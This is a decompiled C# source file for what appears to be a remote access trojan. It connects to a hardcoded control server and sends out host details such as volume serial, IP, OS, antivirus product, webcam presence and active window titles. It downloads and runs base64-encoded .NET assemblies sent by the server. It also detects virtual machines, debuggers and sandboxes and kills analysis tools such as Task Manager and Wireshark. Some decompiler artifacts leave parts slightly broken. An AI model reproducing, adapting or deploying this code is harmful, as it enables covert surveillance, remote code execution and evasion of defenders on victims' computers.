using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Valencia;

public class KK
{
	public static string H = "79.134.225.34";

	public static string P = "8989";

	public static string ID = "Valencia";

	public static string Key = "#BLABLABLA#";

	public static bool IsConnected = false;

	private static DateTime Last = default(DateTime);

	private static TcpClient Z;

	private static string Output;

	private static readonly List<string> ProcessName = new List<string>
	{
		"ProcessHacker", "Taskmgr", "win32_remote", "win64_remote64", "ollydbg", "ProcessHacker", "tcpview", "autoruns", "autorunsc", "filemon",
		"procmon", "regmon", "procexp", "idag", "idaq64", "ImmunityDebugger", "Wireshark", "dumpcap", "HookExplorer", "ImportREC",
		"PETools", "LordPE", "dumpcap", "SysInspector", "proc_analyzer", "SysAnalyzer", "sniff_hit", "windbg", "joeboxcontrol", "joeboxserver",
		"anaagt"
	};

	[STAThread]
	[DebuggerNonUserCode]
	public static void Main()
	{
		R0N();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void RunAntiAnalysis()
	{
		if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
		{
			Environment.FailFast(null);
		}
		while (true)
		{
			DetectProcess();
			Thread.Sleep(10);
		}
	}

	private static bool DetectVirtualMachine()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						string text = current.get_Item("Manufacturer").ToString()!.ToLower();
						if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return false;
	}

	private static bool DetectDebugger()
	{
		bool isDebuggerPresent = false;
		CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
		return isDebuggerPresent;
	}

	private static bool DetectSandboxie()
	{
		if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
		{
			return true;
		}
		return false;
	}

	private static void DetectProcess()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (ProcessName.Contains(process.ProcessName))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	public static void R0N()
	{
		Output = Collect(O: false);
		Thread.Sleep(100);
		checked
		{
			while (true)
			{
				Thread.Sleep(1);
				if (IsConnected)
				{
					try
					{
						if (DateTime.Now.Subtract(Last).TotalSeconds >= 5.0)
						{
							Send(Collect(O: true));
							Last = DateTime.Now;
							Thread.Sleep(10);
							try
							{
								EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							if (IsConnected)
							{
								try
								{
									Z.Client.Poll(1, SelectMode.SelectRead);
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
							}
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						IsConnected = false;
						ProjectData.ClearProjectError();
					}
					try
					{
						if (!Z.Client.Connected)
						{
							IsConnected = false;
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						IsConnected = false;
						ProjectData.ClearProjectError();
					}
					try
					{
						if (Z.Available < 3)
						{
							continue;
						}
						byte[] array = new byte[4];
						Z.Client.Receive(array, 0, array.Length, SocketFlags.None);
						long num = BitConverter.ToInt32(array, 0);
						if (num < 0L || num == 0L)
						{
							continue;
						}
						byte[] array2 = new byte[(int)(num - 1L) + 1];
						long num2 = 0L;
						while (num2 != num)
						{
							if (Z.Available > 0)
							{
								long num3 = Z.Available;
								if (num2 + num3 > num)
								{
									num3 = num - num2;
								}
								Z.Client.Receive(array2, (int)num2, (int)num3, SocketFlags.None);
								num2 += num3;
							}
						}
						using MemoryStream memoryStream = new MemoryStream();
						memoryStream.Write(array2, 0, array2.Length);
						if (memoryStream.ToArray().Length == 21)
						{
							Send(Conversions.ToString(4));
							continue;
						}
						Thread thread = new Thread(delegate(object a0)
						{
							Read((byte[])a0);
						});
						thread.Start(memoryStream.ToArray());
						thread.Join(125);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						IsConnected = false;
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					Thread.Sleep(5000);
					try
					{
						Z.Client.Close();
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					try
					{
						Z.Close();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					Z = null;
					Z = new TcpClient();
					try
					{
						Z.Client.SendBufferSize = 1048576;
						Z.Client.SendTimeout = 25000;
						Z.Client.ReceiveBufferSize = 1048576;
						Z.Client.ReceiveTimeout = 25000;
						Z.Client.Connect(H, Conversions.ToInteger(P));
						IsConnected = true;
						Last = DateTime.Now;
						Send(Output);
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						IsConnected = false;
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public static void Read(byte[] Bytes)
	{
		try
		{
			string[] array = Strings.Split(Encoding.Default.GetString(UnZip(Bytes)), Key, -1, (CompareMethod)0);
			if (Conversions.ToInteger(array[0]) == 1)
			{
				object obj = Assembly.Load(Convert.FromBase64String(array[1])).CreateInstance(array[2]);
				object[] obj2 = new object[3]
				{
					typeof(KK),
					null,
					null
				};
				string[] array2 = array;
				int num = 3;
				string text = (string)(obj2[1] = array2[3]);
				string[] array3 = array;
				int num2 = 4;
				string text2 = (string)(obj2[2] = array3[4]);
				object[] array4 = obj2;
				object[] array5 = array4;
				bool[] obj3 = new bool[3] { false, true, true };
				bool[] array6 = obj3;
				NewLateBinding.LateCall(obj, (Type)null, "R0N", array5, (string[])null, (Type[])null, array6, true);
				if (obj3[1])
				{
					array2[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[1]), typeof(string));
				}
				if (obj3[2])
				{
					array3[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[2]), typeof(string));
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Send(string B)
	{
		try
		{
			Socket client = Z.Client;
			lock (client)
			{
				using MemoryStream memoryStream = new MemoryStream();
				byte[] array = PrefixPacket(Zip(Encoding.UTF8.GetBytes(B)));
				memoryStream.Write(array, 0, array.Length);
				client.Poll(1, SelectMode.SelectWrite);
				client.SendBufferSize = memoryStream.ToArray().Length;
				client.Send(memoryStream.ToArray(), 0, memoryStream.ToArray().Length, SocketFlags.None);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			IsConnected = false;
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] PrefixPacket(byte[] Data)
	{
		byte[] bytes = BitConverter.GetBytes(Data.Length);
		byte[] array = new byte[checked(bytes.Length + Data.Length - 1 + 1)];
		bytes.CopyTo(array, 0);
		Data.CopyTo(array, bytes.Length);
		return array;
	}

	public static byte[] Zip(byte[] data)
	{
		MemoryStream memoryStream = new MemoryStream();
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
		gZipStream.Write(data, 0, data.Length);
		gZipStream.Close();
		return memoryStream.ToArray();
	}

	public static byte[] UnZip(byte[] data)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(data, 0, data.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		for (int num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		gZipStream.Close();
		return memoryStream2.ToArray();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(long hProcess);

	public static string Collect(bool O)
	{
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Expected O, but got Unknown
		if (O)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				GetWindowText(GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
				if (stringBuilder.ToString().Length == 0)
				{
					return Convert.ToString(3) + Key + "-";
				}
				return Convert.ToString(3) + Key + stringBuilder.ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return Convert.ToString(3) + Key + "-";
		}
		string text = "SELECT * From Win32_";
		string[] array = new string[9] { "LogicalDiKK", text, "ComputerSystem", text, "SystemEnclosure", "OperatingSystem", "Processor", text, "SELECT * From AntiVirusProduct" };
		string[] array2 = new string[9] { "VolumeSerialNumber", text, text, text, "ChassisTypes", "Caption", "AddressWidth", "TotalPhysicalMemory", "displayName" };
		array[7] = array[2];
		array2[2] = array2[5];
		checked
		{
			int num = array.Length - 1;
			int i = 0;
			string text2 = null;
			for (; i <= num; i++)
			{
				string text3 = null;
				try
				{
					string text4 = null;
					if (i != 1)
					{
						if (i != 3)
						{
							ManagementObjectSearcher val = ((i == 8) ? new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(text4.Contains("XP"), (object)"", (object)"2").ToString(), array[8]) : new ManagementObjectSearcher(text + array[i]));
							try
							{
								ManagementObjectEnumerator val2 = null;
								try
								{
									val2 = val.Get().GetEnumerator();
									if (val2.MoveNext())
									{
										ManagementObject val3 = (ManagementObject)val2.get_Current();
										switch (i)
										{
										case 4:
											text3 = Conversions.ToString(unchecked((uint)((ushort[])((ManagementBaseObject)val3).get_Item(array2[i]))[0]));
											break;
										default:
											text3 = ((string)((ManagementBaseObject)val3).get_Item(array2[i])).ToString();
											if (i == 5)
											{
												text4 = text3;
											}
											break;
										case 6:
											text3 = ((ushort)((ManagementBaseObject)val3).get_Item(array2[i])).ToString();
											break;
										case 7:
											text3 = ((ulong)((ManagementBaseObject)val3).get_Item(array2[i])).ToString();
											break;
										case 0:
											ID = ID + "_" + ((string)((ManagementBaseObject)val3).get_Item(array2[0])).Trim();
											text3 = ID;
											break;
										}
									}
								}
								finally
								{
									if (val2 != null)
									{
										val2.Dispose();
									}
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							bool flag = false;
							try
							{
								int num2 = 0;
								do
								{
									short num3 = (short)num2;
									string lpszName = Strings.Space(100);
									string lpszVer = null;
									if (!capGetDriverDescriptionA(num3, ref lpszName, 100, ref lpszVer, 100))
									{
										num2++;
										continue;
									}
									flag = true;
									break;
								}
								while (num2 <= 4);
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							text3 = Convert.ToString(flag);
						}
					}
					else
					{
						text3 = ((IPAddress)Dns.GetHostEntry(Dns.GetHostName()).AddressList.GetValue(0)).ToString().Trim();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				if (string.IsNullOrEmpty(text3))
				{
					text3 = ((i != 0) ? "-" : ID);
				}
				text2 = text2 + text3 + Key;
			}
			return Convert.ToString(0) + Key + text2 + Convert.ToString(value: true);
		}
	}
}
